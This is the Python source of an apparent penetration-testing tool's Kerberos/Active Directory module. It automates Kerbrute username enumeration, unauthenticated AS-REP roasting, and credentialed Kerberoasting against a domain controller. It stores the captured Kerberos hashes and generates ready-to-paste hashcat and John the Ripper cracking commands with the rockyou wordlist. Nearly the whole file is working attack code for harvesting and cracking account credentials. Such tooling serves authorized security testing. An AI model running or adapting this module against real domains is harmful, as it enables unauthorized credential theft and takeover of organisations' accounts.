"""
RVR — Kerberos / AD attack module
Triggered when port 88 (Kerberos) is open on a target that looks like an
Active Directory environment.

Unauthenticated steps (run automatically):
  1. Kerbrute user enumeration        — needs the `kerbrute` binary (optional)
  2. AS-REP roasting (GetNPUsers)     — impacket, uses harvested username list

Credentialed steps (opt-in via --creds user:pass, never automatic):
  3. Kerberoasting (GetUserSPNs)      — impacket, needs valid credentials

Captured hashes are written to <output>/hashes/ and paired with ready-to-paste
hashcat / John cracking commands, both on screen and in the report.
"""

import re
from pathlib import Path
from typing import Dict, Any, List, Optional
from datetime import datetime

from rvr.modules.base import BaseModule
from rvr.utils.console import log_warn, log_info, log_success, console
from rvr.utils.state import RVRState

# hashcat mode per Kerberos hash prefix (etype)
HASHCAT_MODES = {
    "$krb5asrep$23$": 18200,   # AS-REP RC4
    "$krb5asrep$17$": 19900,   # AS-REP AES128
    "$krb5asrep$18$": 20000,   # AS-REP AES256
    "$krb5tgs$23$":   13100,   # TGS-REP RC4 (Kerberoast)
    "$krb5tgs$17$":   19600,   # TGS-REP AES128
    "$krb5tgs$18$":   19700,   # TGS-REP AES256
}

ROCKYOU = "/usr/share/wordlists/rockyou.txt"


class KerberosModule(BaseModule):
    def __init__(self, state: RVRState, profile: Dict[str, Any]):
        super().__init__(state, profile)
        self.krb_dir = self.ensure_dir("kerberos")
        self.hash_dir = self.ensure_dir("hashes")

    # ── Entry points ─────────────────────────────────────────────
    def run(self):
        domain = self.state.get_domain()
        if not domain:
            log_warn("Kerberos port open but no AD domain identified yet "
                     "(need LDAP/RDP/SMB findings) — limited to Kerbrute")
            domain = ""

        self._run_kerbrute(domain)
        self._run_asrep_roast(domain)

        # Kerberoasting is credentialed — opt-in only via --creds
        if self.state.ad_credentials:
            self._run_kerberoast(domain)

        self._write_crack_commands()
        self._print_summary()

    def run_kerberoast(self, creds: Optional[str] = None):
        """Micro-mode entry: credentialed Kerberoasting."""
        creds = creds or self.state.ad_credentials
        if not creds:
            log_warn("Kerberoasting needs credentials — pass --creds 'user:pass'")
            return
        self.state.ad_credentials = creds
        self._run_kerberoast(self.state.get_domain() or "")
        self._write_crack_commands()
        self._print_summary()

    # ── Step 1: Kerbrute user enumeration ────────────────────────
    def _run_kerbrute(self, domain: str):
        if not self.tool_exists(self.tool("kerbrute")):
            log_info("kerbrute not installed — skipping user enum "
                     "(AS-REP roasting falls back to harvested usernames). "
                     "Install: go install github.com/ropnop/kerbrute@latest")
            return

        userlist = self.config.wordlist("usernames")
        if not userlist or not Path(userlist).exists():
            log_warn(f"Username wordlist not found: {userlist}")
            return

        console.print("  [cyan]○[/cyan]  Kerbrute user enumeration...", end="\r")
        t0 = datetime.now()
        out_file = self.krb_dir / "kerbrute_users.txt"

        cmd = [
            self.tool("kerbrute"), "userenum",
            "--dc", self.state.target,
            "-d", domain or self.state.target,
            userlist,
        ]
        output = self.run_command(cmd, output_file=out_file, timeout=180, silent=True) or ""
        elapsed = (datetime.now() - t0).seconds

        valid = re.findall(r"VALID USERNAME:\s*(\S+)@", output)
        valid = sorted(set(v.split("@")[0] for v in valid))
        if valid:
            self.state.kerberos_findings["valid_users"] = valid
            self.state.add_artifact("kerbrute_users", out_file)
            console.print(
                f"  [green]✓[/green]  Kerbrute — [bold yellow]{len(valid)} valid username(s)[/bold yellow]  [dim]({elapsed}s)[/dim]"
            )
        else:
            console.print(f"  [dim]✓  Kerbrute — no valid usernames  ({elapsed}s)[/dim]")

    # ── Step 2: AS-REP roasting (unauthenticated) ────────────────
    def _run_asrep_roast(self, domain: str):
        if not domain:
            log_warn("No domain known — skipping AS-REP roast (LDAP/RDP enumeration runs in parallel)")
            return
        if not self.tool_exists(self.tool("getnpusers")):
            log_warn(f"{self.tool('getnpusers')} not found — skipping AS-REP roast")
            return

        users = self.state.get_ad_users()
        max_users = self.config.active_directory.get("max_asrep_users", 200)
        if not users:
            log_info("No usernames harvested yet — nothing to AS-REP roast")
            return
        if len(users) > max_users:
            log_info(f"Capping AS-REP list at {max_users} of {len(users)} usernames")
            users = users[:max_users]

        console.print(f"  [cyan]○[/cyan]  AS-REP roast — {len(users)} candidate(s)...", end="\r")
        t0 = datetime.now()

        users_file = self.krb_dir / "asrep_users.txt"
        users_file.write_text("\n".join(users) + "\n")
        out_file = self.krb_dir / "asrep_hashes.txt"

        cmd = [
            self.tool("getnpusers"),
            "-dc-ip", self.state.target,
            "-no-pass",
            "-usersfile", str(users_file),
            "-format", "hashcat",
            "-outputfile", str(out_file),
            f"{domain}/",
        ]
        self.run_command(cmd, timeout=300, silent=True)
        elapsed = (datetime.now() - t0).seconds

        hashes: List[str] = []
        if out_file.exists():
            hashes = [l.strip() for l in out_file.read_text().splitlines() if l.strip().startswith("$krb5asrep")]

        self.state.kerberos_findings["asrep_roast"] = {
            "accounts": [self._account_from_hash(h) for h in hashes],
            "count": len(hashes),
        }
        self.state.add_artifact("asrep_hashes", out_file)

        if hashes:
            for h in hashes:
                self.state.captured_hashes.append({
                    "type": "asrep",
                    "account": self._account_from_hash(h),
                    "hash": h[:60] + "..." if len(h) > 60 else h,
                    "crack_cmd": self._hashcat_cmd(h, out_file),
                })
            console.print(
                f"  [red]✓[/red]  AS-REP roast — [bold red]{len(hashes)} roastable account(s)[/bold red]  "
                f"[dim]({elapsed}s)[/dim]"
            )
        else:
            console.print(f"  [dim]✓  AS-REP roast — no accounts without pre-auth  ({elapsed}s)[/dim]")

    # ── Step 3: Kerberoasting (credentialed, opt-in) ─────────────
    def _run_kerberoast(self, domain: str):
        if not domain:
            log_warn("No domain known — cannot Kerberoast")
            return
        if not self.tool_exists(self.tool("getuserspns")):
            log_warn(f"{self.tool('getuserspns')} not found — skipping Kerberoast")
            return

        creds = self.state.ad_credentials
        if ":" not in creds:
            log_warn("--creds must look like 'user:pass'")
            return
        user, passwd = creds.split(":", 1)

        console.print("  [cyan]○[/cyan]  Kerberoasting SPN accounts (credentialed)...", end="\r")
        t0 = datetime.now()

        out_file = self.hash_dir / "kerberoast_hashes.txt"
        out_file.parent.mkdir(parents=True, exist_ok=True)

        cmd = [
            self.tool("getuserspns"),
            "-dc-ip", self.state.target,
            "-request",
            "-outputfile", str(out_file),
            f"{domain}/{user}:{passwd}",
        ]
        output = self.run_command(cmd, timeout=300, silent=True) or ""
        elapsed = (datetime.now() - t0).seconds

        hashes: List[str] = []
        if out_file.exists():
            hashes = [l.strip() for l in out_file.read_text().splitlines() if l.strip().startswith("$krb5tgs")]

        spn_accounts = re.findall(r"SPN:\s*(\S+)", output)
        self.state.kerberos_findings["kerberoast"] = {
            "accounts": sorted(set(spn_accounts)),
            "count": len(hashes),
            "auth_user": user,
        }
        self.state.add_artifact("kerberoast_hashes", out_file)

        if hashes:
            for h in hashes:
                self.state.captured_hashes.append({
                    "type": "kerberoast",
                    "account": self._account_from_hash(h),
                    "hash": h[:60] + "..." if len(h) > 60 else h,
                    "crack_cmd": self._hashcat_cmd(h, out_file),
                })
            console.print(
                f"  [red]✓[/red]  Kerberoast — [bold red]{len(hashes)} service account hash(es)[/bold red]  "
                f"[dim]({elapsed}s)[/dim]"
            )
        else:
            console.print(f"  [dim]✓  Kerberoast — no SPN accounts / auth failed  ({elapsed}s)[/dim]")

    # ── Helpers ──────────────────────────────────────────────────
    def _account_from_hash(self, hash_line: str) -> str:
        m = re.search(r"\$(?:krb5asrep|krb5tgs)\$\d+\$([^:]+)", hash_line)
        return m.group(1) if m else "unknown"

    def _hashcat_cmd(self, hash_line: str, hash_file: Path) -> str:
        for prefix, mode in HASHCAT_MODES.items():
            if hash_line.startswith(prefix):
                wordlist = ROCKYOU if Path(ROCKYOU).exists() else "/path/to/wordlist"
                return f"hashcat -m {mode} '{hash_file}' {wordlist}"
        return f"hashcat --identify '{hash_file}'"

    def _write_crack_commands(self):
        """Persist ready-to-paste cracking commands next to the captured hashes."""
        if not self.state.captured_hashes:
            return

        cmds_file = self.hash_dir / "crack_commands.sh"
        lines = [
            "#!/usr/bin/env bash",
            "# RVR — generated hash cracking commands",
            "# Each command is ready to paste; swap the wordlist for your own if preferred.",
            "",
        ]
        seen = set()
        for h in self.state.captured_hashes:
            # crack_cmd embeds the hash file path — dedupe identical commands
            if h["crack_cmd"] not in seen:
                seen.add(h["crack_cmd"])
        for cmd in sorted(seen):
            lines.append(cmd)
            lines.append("")

        lines.append("# John the Ripper alternative (auto-detects krb5asrep / krb5tgs formats):")
        for name in ["asrep_hashes.txt", "kerberoast_hashes.txt"]:
            for base in (self.krb_dir, self.hash_dir):
                target = base / name
                if target.exists():
                    wordlist = ROCKYOU if Path(ROCKYOU).exists() else "/path/to/wordlist"
                    lines.append(f"john --wordlist={wordlist} '{target}'")
                    break

        cmds_file.write_text("\n".join(lines) + "\n")
        self.state.add_artifact("crack_commands", cmds_file)

    def _print_summary(self):
        k = self.state.kerberos_findings
        if not k and not self.state.captured_hashes:
            return
        console.print()
        console.print("  [bold cyan]Kerberos Summary[/bold cyan]")
        if k.get("valid_users"):
            console.print(f"  Valid users:       [yellow]{len(k['valid_users'])} via Kerbrute[/yellow]")
        asrep = k.get("asrep_roast", {})
        if asrep:
            color = "red" if asrep.get("count") else "green"
            console.print(f"  AS-REP roastable:  [{color}]{asrep.get('count', 0)} account(s)[/{color}]")
            if asrep.get("accounts"):
                console.print(f"  Roastable users:   [cyan]{', '.join(asrep['accounts'][:10])}[/cyan]")
        kerb = k.get("kerberoast", {})
        if kerb:
            color = "red" if kerb.get("count") else "green"
            console.print(f"  Kerberoastable:    [{color}]{kerb.get('count', 0)} service account(s)[/{color}]")
        if self.state.captured_hashes:
            console.print(f"  Crack commands:    [magenta]{self.hash_dir / 'crack_commands.sh'}[/magenta]")
        console.print()
